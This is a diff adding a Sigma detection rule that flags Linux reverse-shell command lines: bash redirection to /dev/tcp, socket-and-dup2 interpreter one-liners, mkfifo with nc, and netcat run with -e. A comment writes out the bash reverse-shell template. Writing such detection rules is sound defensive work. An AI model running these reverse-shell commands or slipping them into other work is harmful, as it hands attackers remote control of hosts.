@@ -1,0 +1,68 @@
+title: Interactive Shell Spawned With Redirected Network File Descriptor
+id: d4a0e618-9257-4f83-b1c6-7ae52d09fb31
+status: test
+description: >
+  Detects the shell invocations used to establish a reverse shell on Linux -
+  bash redirecting to /dev/tcp, or an interpreter one-liner that connects a
+  socket to a shell. These patterns have almost no legitimate use, because an
+  administrator with a working shell has no reason to construct another one out
+  of file-descriptor redirection. The rule matches on the command line rather
+  than on network telemetry, so it fires even when the callback destination is
+  new and unknown to any threat feed.
+author: Wael Qumayi
+date: 2026/08/14
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+  - https://gtfobins.github.io/
+tags:
+  - attack.execution
+  - attack.t1059.004
+  - attack.command-and-control
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  # bash -i >& /dev/tcp/host/port 0>&1  and its many spacing variants
+  selection_devtcp:
+    CommandLine|contains:
+      - '/dev/tcp/'
+      - '/dev/udp/'
+
+  # Interpreter one-liners that wire a socket to a shell.
+  selection_socket_to_shell:
+    CommandLine|contains|all:
+      - 'socket'
+      - 'dup2'
+
+  selection_named_pipe:
+    CommandLine|contains|all:
+      - 'mkfifo'
+      - 'nc '
+
+  # netcat compiled with -e, or its openbsd equivalent using -c
+  selection_nc_exec:
+    CommandLine|re: '(?i)\bn(c|cat|etcat)\b.*\s-[a-z]*[ec]\s+/bin/(ba|z|a|da)?sh'
+
+  # Scanners and monitoring tools legitimately probe ports through /dev/tcp.
+  filter_port_check:
+    CommandLine|contains:
+      - 'timeout 1 bash -c'
+      - '&>/dev/null && echo open'
+
+  condition: 1 of selection_* and not filter_port_check
+
+fields:
+  - CommandLine
+  - User
+  - ParentImage
+
+falsepositives:
+  - Health-check and monitoring scripts that use /dev/tcp as a lightweight port
+    test instead of installing netcat. These are short, repetitive and always
+    target the same internal hosts, so they are easy to allow-list by parent
+    process once identified.
+  - Penetration testing and security training activity on hosts where that is
+    expected. Scope the rule out of dedicated lab subnets rather than removing it.
+  - Container health probes in minimal images without curl.
+
+level: high
